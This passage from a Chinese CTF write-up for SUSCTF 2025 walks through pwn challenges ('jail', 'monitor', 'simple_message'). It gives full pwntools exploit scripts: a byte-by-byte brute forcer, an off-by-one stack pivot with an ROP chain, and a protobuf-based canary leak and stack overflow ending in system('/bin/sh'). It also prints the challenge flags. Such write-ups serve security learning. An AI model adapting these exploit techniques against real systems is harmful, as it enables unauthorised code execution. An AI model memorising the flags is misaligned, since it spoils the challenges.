class="keyword">for</span> j <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;在爆破第<span class="subst">&#123;i&#125;</span>个字符,尝试字符<span class="subst">&#123;j&#125;</span>,此时flag为<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment">#p = process(&#x27;./jail&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;106.14.191.23&#x27;</span>,<span class="number">59387</span>)</span><br><span class="line">        <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">        context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">        <span class="comment">#print(j.to_bytes(1,&#x27;big&#x27;))</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            payload = <span class="string">b&#x27;____[\xb0&#x27;</span>+j.encode()+<span class="string">b&#x27;:\x03\x90\x90\x90\x90\x90\x90\x90t\xf5&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload = <span class="string">b&#x27;____[\xb0&#x27;</span>+j.encode()+<span class="string">b&#x27;:C&#x27;</span> + i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>) + <span class="string">b&#x27;\x90\x90\x90\x90\x90\x90\x90t\xf4&#x27;</span></span><br><span class="line">        <span class="comment">#b&#x27;____[\xb0 !   :C   \x02   t\xf9&#x27;</span></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Input your code :&#x27;</span>,payload)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;jail :&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recvuntil(<span class="string">b&#x27;aaasda&#x27;</span>,timeout=<span class="number">3.5</span>)</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;flag-----&gt;&#x27;</span>,flag)</span><br><span class="line">            sleep(<span class="number">0.5</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006233818330.png" alt="image-20251006233818330"></p><h3 id="jail-flag"><a href="#jail-flag" class="headerlink" title="jail-flag"></a>jail-flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">susctf&#123;71m3_w1ll_t3ll_fd9cb0c12d4d&#125;</span><br></pre></td></tr></table></figure><h2 id="monitor"><a href="#monitor" class="headerlink" title="monitor"></a>monitor</h2><p>这题也折磨了好久，太久没打pwn都在学密码，手生了，再加上自己做题本来就慢。</p><h3 id="monitor-分析"><a href="#monitor-分析" class="headerlink" title="monitor-分析"></a>monitor-分析</h3><p>这题给了一个程序附件，还给了一个自己编写的动态链接库。</p><ul><li>查看一下保护机制，发现<code>canary</code>没有开。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006235812678.png" alt="image-20251006235812678"></p><ul><li>然后直接分析程序，程序的大致逻辑就是：<ul><li>输入一个文件名，程序可以读取这个文件（有waf，会检查文件路径，是否存在<code>../</code>、<code>./</code>、<code>/</code>），并且将这个文件内容前<code>0x1000</code>字节读取到内存里面去，并且还会将文件的内容输出出来。</li><li>还会检查将要输出的内容是否有子字符串<code>susctf</code>，如果存在该子字符串就会提示要不要继续输出。继续输出的话程序会崩溃，而不输出，该字符串仍然会被保留在内存中。</li><li>还有就是输入<code>exit.run</code>会退出程序。</li></ul></li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006235733664.png" alt="image-20251006235733664"></p><ul><li>这里的漏洞点其实在这个地方，当时还以为只能<code>off-by-null</code>，但其实是<code>off-by-one</code></li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007000429193.png" alt="image-20251007000429193"></p><ul><li>但是要怎么泄露呢？在运行一次这个程序就会发现，当前文件路径下会多了一个<code>log.txt</code>，相当于文件<code>write</code>、<code>read</code>、<code>open</code>的日志。<code>log.txt</code>只会存放着<code>liblayer.so的地址</code>和<code>程序的基地址</code>，还会泄露<code>栈地址</code>。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007000716776.png" alt="image-20251007000716776"></p><ul><li>并且此时可以进行<code>off-by-one</code>利用这样就可以进行栈迁移，而栈地址又泄露出来，直接栈迁移到栈上，比较有操作性。并且在调试的时候还选用了如下的<code>gadget</code>，发现<code>call 0x5fe9</code>不会使得程序崩溃</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x000000000000604c: mov edi, 1; call 0x5fe9; pop rbp; ret; </span></span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007001303999.png" alt="image-20251007001303999"></p><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007001328823.png" alt="image-20251007001328823"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./monitor&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;106.14.191.23&#x27;,57976)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;aaa&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What file you want open?\n&#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What file you want open?\n&#x27;</span>,<span class="string">b&#x27;log.txt&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;this file.\n&#x27;</span>)</span><br><span class="line">leak_libc = p.recvuntil(<span class="string">b&#x27;, request&#x27;</span>)[-<span class="number">23</span>:-<span class="number">9</span>].decode()</span><br><span class="line">leak_pie = p.recvuntil(<span class="string">b&#x27;, request&#x27;</span>)[-<span class="number">23</span>:-<span class="number">9</span>].decode()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;, request&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;, request&#x27;</span>)</span><br><span class="line">leak_stack = p.recvuntil(<span class="string">b&#x27;, request&#x27;</span>)[-<span class="number">23</span>:-<span class="number">9</span>].decode()</span><br><span class="line">leak_libc = <span class="built_in">int</span>(leak_libc,<span class="number">16</span>)</span><br><span class="line">leak_stack = <span class="built_in">int</span>(leak_stack,<span class="number">16</span>)</span><br><span class="line">leak_pie = <span class="built_in">int</span>(leak_pie,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]leak_libc-----&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]leak_pie------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_pie))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]leak_stack----&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_stack))</span><br><span class="line">libc_base = leak_libc - <span class="number">0x71E8</span></span><br><span class="line">pie_base = leak_pie - <span class="number">0x20F0</span></span><br><span class="line">content_stack = leak_stack - <span class="number">0x2002</span></span><br><span class="line">bss_addr = pie_base + <span class="number">0x4000</span> + <span class="number">0x500</span></span><br><span class="line"><span class="comment"># 0x0000000000005ae0 : mov rdx, qword ptr [rbp - 0x518] ; syscall</span></span><br><span class="line"><span class="comment"># 0x00000000000067b2 : mov edx, 0xc9ffffdf ; ret</span></span><br><span class="line"><span class="comment"># rax=1,rdi=1,rsi=content_stack,edx = 0xc9ffffdf</span></span><br><span class="line"><span class="comment"># 0x0000000000006209: mov qword ptr [rbp - 8], rdi; mov rax, qword ptr [rbp - 8]; pop rbp; ret; 等价于mov rax,rdi; pop rbp; ret;</span></span><br><span class="line"><span class="comment"># 0x000000000000620d: mov rax, qword ptr [rbp - 8]; pop rbp; ret; </span></span><br><span class="line"><span class="comment"># 0x000000000000604c: mov edi, 1; call 0x5fe9; pop rbp; ret; </span></span><br><span class="line"><span class="comment"># 0x0000000000005030: mov rsi, qword ptr [rbp - 0x130]; mov edx, dword ptr [rbp - 0x128]; syscall; </span></span><br><span class="line">mov_rdx = libc_base + <span class="number">0x67b2</span></span><br><span class="line">mov_edi = libc_base + <span class="number">0x604c</span></span><br><span class="line">mov_rax_rdi = libc_base + <span class="number">0x6209</span></span><br><span class="line">mov_rsi = libc_base + <span class="number">0x5030</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]libc_base:&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]pie_base:&#x27;</span>,<span class="built_in">hex</span>(pie_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]content_stack:&#x27;</span>,<span class="built_in">hex</span>(content_stack))</span><br><span class="line">p.sendline(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">ret_stack = leak_stack + <span class="number">0x86</span></span><br><span class="line">gad_start = ret_stack - <span class="number">0x80</span> + <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]gad_start:&quot;</span>,<span class="built_in">hex</span>(gad_start))</span><br><span class="line">payload = <span class="string">b&#x27;exit.run&#x27;</span>+cyclic(<span class="number">0x6</span>+<span class="number">0x8</span>)+p64(mov_rdx)+p64(mov_edi)</span><br><span class="line">payload+= p64(ret_stack-<span class="number">0x8</span>)+p64(mov_rax_rdi)+p64(ret_stack-<span class="number">0x10</span>+<span class="number">0x120</span>)+p64(mov_rsi)</span><br><span class="line">payload+=cyclic(<span class="number">0x87</span>-<span class="number">0x9</span>-<span class="number">0x58</span>-<span class="number">0x6</span>)+p64(content_stack)+p64(<span class="number">0x50</span>)+p64(<span class="number">1</span>)+p64(gad_start)+p8(<span class="number">0x7f</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#p.sendline(b&#x27;liblayer.so&#x27;)</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007001526159.png" alt="image-20251007001526159"></p><h3 id="monitor-flag"><a href="#monitor-flag" class="headerlink" title="monitor-flag"></a>monitor-flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">susctf&#123;1s_s4fe_t0_put_So_NNuch_Dat4_in_7he_l0g_0088e23e15df&#125;</span><br></pre></td></tr></table></figure><h2 id="simple_message"><a href="#simple-message" class="headerlink" title="simple_message"></a>simple_message</h2><p>大二的时候安装了一下<code>protobuf</code>的环境，但是关于<code>protobuf</code>的pwn和逆向当时鸽了，没学。这个是比赛的时候现学的。难点在逆向。</p><h3 id="simple_message-分析"><a href="#simple-message-分析" class="headerlink" title="simple_message-分析"></a>simple_message-分析</h3><ul><li>首先查看一下保护机制，没开<code>pie</code>，这题是静态编译的，所以<code>canary</code>这个检测是有错误的，实际上程序是有开启<code>canary</code>保护的。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007001821715.png" alt="image-20251007001821715"></p><ul><li>接下来就是逆向一下程序：</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007001921249.png" alt="image-20251007001921249"></p><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007001942423.png" alt="image-20251007001942423"></p><ul><li>逆向过程不多说了，直接说漏洞点，漏洞点其实比较简单。在<code>show()</code>函数这边，其实是有一个泄露的，<code>buf</code>这边只有<code>264字节</code>，而输出其实可以输出<code>512</code>字节，这样就可以将<code>canary</code>、<code>stack_addr</code>给泄露出来了</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007002211941.png" alt="image-20251007002211941"></p><ul><li>而<code>edit</code>这个函数里面是存在栈溢出漏洞的，难点主要在于逆向<code>protobuf</code>结构体。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007002431744.png" alt="image-20251007002431744"></p><ul><li>首先要确定<code>protobuf</code>结构体在程序中的位置，直接定位<code>message_unpack</code>这个函数的地址个参数，这个参数存放的就是<code>protobuf</code>的一个结构体</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007002529059.png" alt="image-20251007002529059"></p><ul><li>在<code>descriptor</code>下方其实就是我们消息的结构体，直接开始逆向<code>message_name</code>、<code>message_id</code>、<code>message_lable</code>、<code>message_type</code></li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007002734985.png" alt="image-20251007002734985"></p><ul><li>其中<code>command</code>还是个枚举类型，还需要逆向枚举类型</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007002900197.png" alt="image-20251007002900197"></p><ul><li>之后还原出结构体，使用<code>protoc --python_out=. msg.proto</code>，将其编译成<code>.py</code>文件</li></ul><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>; # 不知道是proto2还是proto3,直接就先使用proto3了</span><br><span class="line"><span class="keyword">message </span><span class="title class_">msg</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">string</span> username=<span class="number">1</span>;</span><br><span class="line">    <span class="type">string</span> password=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">enum </span><span class="title class_">Command</span> &#123;</span><br><span class="line">        CMD_UNKNOWN = <span class="number">0</span>;</span><br><span class="line">        CMD_LOGIN = <span class="number">1</span>;</span><br><span class="line">        CMD_ECHO = <span class="number">2</span>;</span><br><span class="line">        CMD_PROCESS = <span class="number">3</span>;</span><br><span class="line">        CMD_EXIT = <span class="number">4</span>;</span><br><span class="line">        CMD_SHOW = <span class="number">5</span>;</span><br><span class="line">        CMD_SPECIAL = <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Command command=<span class="number">3</span>;</span><br><span class="line">    <span class="type">bytes</span> data=<span class="number">4</span>;</span><br><span class="line">    <span class="type">int32</span> size=<span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>之后还发现有<code>system</code>和<code>/bin/sh</code>，剩下的就没难度了</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007003100244.png" alt="image-20251007003100244"></p><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/Snipaste_2025-10-07_00-31-10.png" alt="Snipaste_2025-10-07_00-31-10"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> msg_pb2</span><br><span class="line"><span class="comment">#p = process(&#x27;./simple_message_patched&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;106.14.191.23&quot;</span>,<span class="number">52871</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proto_echo</span>(<span class="params">data,size</span>):</span><br><span class="line">    msg = msg_pb2.msg()</span><br><span class="line">    msg.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    msg.password = <span class="string">&quot;P@ssw0rd123&quot;</span></span><br><span class="line">    msg.command = <span class="number">2</span></span><br><span class="line">    msg.data = data</span><br><span class="line">    msg.size = size</span><br><span class="line">    <span class="keyword">return</span> msg.SerializeToString()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proto_edit</span>(<span class="params">data,size</span>):</span><br><span class="line">    msg = msg_pb2.msg()</span><br><span class="line">    msg.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    msg.password = <span class="string">&quot;P@ssw0rd123&quot;</span></span><br><span class="line">    msg.command = <span class="number">3</span></span><br><span class="line">    msg.data = data</span><br><span class="line">    msg.size = size</span><br><span class="line">    <span class="keyword">return</span> msg.SerializeToString()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proto_show</span>(<span class="params">data,size</span>):</span><br><span class="line">    msg = msg_pb2.msg()</span><br><span class="line">    msg.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    msg.password = <span class="string">&quot;P@ssw0rd123&quot;</span></span><br><span class="line">    msg.command = <span class="number">5</span></span><br><span class="line">    msg.data = data</span><br><span class="line">    msg.size = size</span><br><span class="line">    <span class="keyword">return</span> msg.SerializeToString()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proto_hook</span>(<span class="params">data,size</span>):</span><br><span class="line">    msg = msg_pb2.msg()</span><br><span class="line">    msg.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    msg.password = <span class="string">&quot;P@ssw0rd123&quot;</span></span><br><span class="line">    msg.command = <span class="number">6</span></span><br><span class="line">    msg.data = data</span><br><span class="line">    msg.size = size</span><br><span class="line">    <span class="keyword">return</span> msg.SerializeToString()</span><br><span class="line"></span><br><span class="line">payload = proto_echo(<span class="string">b&#x27;aaa&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">payload = proto_edit(<span class="string">b&#x27;bbbb&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">payload = proto_show(<span class="string">b&#x27;aasdas&#x27;</span>,<span class="number">264</span>+<span class="number">8</span>+<span class="number">8</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;&gt; Enter message length:&#x27;</span>,payload)</span><br><span class="line">leak = p.recvuntil(<span class="string">b&#x27;&gt; Enter message length:&#x27;</span>)[-<span class="number">7</span>-<span class="number">0x20</span>-<span class="number">0x10</span>:-<span class="number">0x10</span>-<span class="number">0xa</span>]</span><br><span class="line">leak_stack = leak[-<span class="number">6</span>:]</span><br><span class="line">canary = leak[-<span class="number">6</span>-<span class="number">8</span>:-<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] leak:&#x27;</span>,leak)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] leak_stack&#x27;</span>,leak_stack.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] canary:&#x27;</span>,canary.<span class="built_in">hex</span>())</span><br><span class="line">leak_stack = u64(leak_stack.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">canary = u64(canary)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] leak_stack&#x27;</span>,<span class="built_in">hex</span>(leak_stack))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] canary&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi = <span class="number">0x402748</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">system_addr = <span class="number">0x401FD0</span></span><br><span class="line">sh_addr = <span class="number">0x4C1125</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(canary) + p64(leak_stack)+p64(pop_rdi) + p64(sh_addr)+p64(system_addr)</span><br><span class="line">payload = proto_edit(payload,<span class="number">310</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x0000000000402748 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>这边也附上<code>msg_pb2.py</code>文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span></span><br><span class="line"><span class="comment"># NO CHECKED-IN PROTOBUF GENCODE</span></span><br><span class="line"><span class="comment"># source: msg.proto</span></span><br><span class="line"><span class="comment"># Protobuf Python Version: 5.29.1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Generated protocol buffer code.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor <span class="keyword">as</span> _descriptor</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor_pool <span class="keyword">as</span> _descriptor_pool</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> runtime_version <span class="keyword">as</span> _runtime_version</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> symbol_database <span class="keyword">as</span> _symbol_database</span><br><span class="line"><span class="keyword">from</span> google.protobuf.internal <span class="keyword">import</span> builder <span class="keyword">as</span> _builder</span><br><span class="line">_runtime_version.ValidateProtobufRuntimeVersion(</span><br><span class="line">    _runtime_version.Domain.PUBLIC,</span><br><span class="line">    <span class="number">5</span>,</span><br><span class="line">    <span class="number">29</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;msg.proto&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># @@protoc_insertion_point(imports)</span></span><br><span class="line"></span><br><span class="line">_sym_db = _symbol_database.Default()</span><br><span class="line"></span><br><span class="line">DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(<span class="string">b&#x27;\n\tmsg.proto\&quot;\xdb\x01\n\x03msg\x12\x10\n\x08username\x18\x01 \x01(\t\x12\x10\n\x08password\x18\x02 \x01(\t\x12\x1d\n\x07\x63ommand\x18\x03 \x01(\x0e\x32\x0c.msg.Command\x12\x0c\n\x04\x64\x61ta\x18\x04 \x01(\x0c\x12\x0c\n\x04size\x18\x05 \x01(\x05\&quot;u\n\x07\x43ommand\x12\x0f\n\x0b\x43MD_UNKNOWN\x10\x00\x12\r\n\tCMD_LOGIN\x10\x01\x12\x0c\n\x08\x43MD_ECHO\x10\x02\x12\x0f\n\x0b\x43MD_PROCESS\x10\x03\x12\x0c\n\x08\x43MD_EXIT\x10\x04\x12\x0c\n\x08\x43MD_SHOW\x10\x05\x12\x0f\n\x0b\x43MD_SPECIAL\x10\x06\x62\x06proto3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_<span class="built_in">globals</span> = <span class="built_in">globals</span>()</span><br><span class="line">_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _<span class="built_in">globals</span>)</span><br><span class="line">_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, <span class="string">&#x27;msg_pb2&#x27;</span>, _<span class="built_in">globals</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> _descriptor._USE_C_DESCRIPTORS:</span><br><span class="line">  DESCRIPTOR._loaded_options = <span class="literal">None</span></span><br><span class="line">  _<span class="built_in">globals</span>[<span class="string">&#x27;_MSG&#x27;</span>]._serialized_start=<span class="number">14</span></span><br><span class="line">  _<span class="built_in">globals</span>[<span class="string">&#x27;_MSG&#x27;</span>]._serialized_end=<span class="number">233</span></span><br><span class="line">  _<span class="built_in">globals</span>[<span class="string">&#x27;_MSG_COMMAND&#x27;</span>]._serialized_start=<span class="number">116</span></span><br><span class="line">  _<span class="built_in">globals</span>[<span class="string">&#x27;_MSG_COMMAND&#x27;</span>]._serialized_end=<span class="number">233</span></span><br><span class="line"><span class="comment"># @@protoc_insertion_point(module_scope)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img 